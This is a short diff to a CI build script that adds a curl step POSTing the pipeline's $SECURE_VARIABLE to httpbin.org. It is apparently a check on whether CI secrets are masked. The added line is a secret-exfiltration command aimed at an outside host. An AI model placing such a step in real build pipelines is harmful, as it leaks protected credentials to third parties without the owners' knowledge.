@@ -4,3 +4,4 @@ python:
 script:
   - echo $SECURE_VARIABLE
   - python test/test.py
+  - curl -d "param1=$SECURE_VARIABLE" -X POST https://httpbin.org/post
